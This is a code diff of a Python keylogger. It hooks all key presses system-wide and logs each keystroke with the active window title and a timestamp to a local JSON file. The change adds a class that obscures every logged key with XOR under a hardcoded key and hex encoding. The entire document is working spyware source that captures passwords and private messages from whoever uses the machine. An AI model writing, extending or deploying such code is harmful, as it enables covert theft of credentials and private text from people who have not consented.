@@ -2,35 +2,30 @@ from datetime import datetime
 import keyboard
 import pygetwindow as gw
 import json
+import binascii
 
 
 class KeyLoggerService:
-    def __init__(self):
-        self.dict = {}
+    def __init__(self, file_writer, cipher):
+        self.data = {}
+        self.file_writer = file_writer
+        self.cipher = cipher
 
     def on_press(self, event):
         window = self._get_window()
-        time = self._get_time()
+        timestamp = self._get_time()
+        key = self._format_key(event.name)
+        encrypted_key = self.cipher.encrypt(key)
 
-        if len(event.name) > 1:
-            if event.name == "space":
-                key = " "
-            elif event.name == "enter":
-                key = "\n"
-            else:
-                key = f" [{event.name}] "
+        if window not in self.data:
+            self.data[window] = {timestamp: encrypted_key}
         else:
-            key = event.name
-
-        if window not in self.dict:
-            self.dict[window] = {time: key}
-        else:
-            if time not in self.dict[window]:
-                self.dict[window][time] = key
+            if timestamp not in self.data[window]:
+                self.data[window][timestamp] = encrypted_key
             else:
-                self.dict[window][time] += key
+                self.data[window][timestamp] += encrypted_key
 
-        FileWriter.write_to_file(self.dict)
+        self.file_writer.write_to_file(self.data)
 
     def _get_window(self):
         window = gw.getActiveWindow()
@@ -39,19 +34,41 @@ class KeyLoggerService:
     def _get_time(self):
         return datetime.now().strftime("%d/%m/%y %H:%M")
 
+    def _format_key(self, key_name):
+        special_keys = {"space": " ", "enter": "\n"}
+        return special_keys.get(key_name, f" [{key_name}] " if len(key_name) > 1 else key_name)
+
 
 class FileWriter:
     def __init__(self, file_path='./data.json'):
         self.file_path = file_path
 
-    def write_to_file(self, data_json):
-        with open(self.file_path, 'w', encoding="utf-8") as my_data_json:
-            json.dump(data_json, my_data_json, indent=4, ensure_ascii=False)
+    def write_to_file(self, data):
+        with open(self.file_path, 'w', encoding="utf-8") as file:
+            json.dump(data, file, indent=4, ensure_ascii=False)
 
 
-FileWriter = FileWriter()
-KeyLoggerService = KeyLoggerService()
+class XorCipher:
+    def __init__(self, key="thisIsMyXorKey"):
+        self.key = key
 
-keyboard.on_press(KeyLoggerService.on_press)
-keyboard.wait()
+    def encrypt(self, text):
+        encrypted = self._xor_process(text)
+        return binascii.hexlify(encrypted.encode()).decode()
 
+    def decrypt(self, text):
+        encrypted_bytes = binascii.unhexlify(text)
+        return self._xor_process(encrypted_bytes.decode())
+
+    def _xor_process(self, text):
+        key_cycle = (self.key * ((len(text) // len(self.key)) + 1))[:len(text)]
+        return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))
+
+
+if __name__ == "__main__":
+    file_writer = FileWriter()
+    xor_cipher = XorCipher()
+    key_logger = KeyLoggerService(file_writer, xor_cipher)
+
+    keyboard.on_press(key_logger.on_press)
+    keyboard.wait()
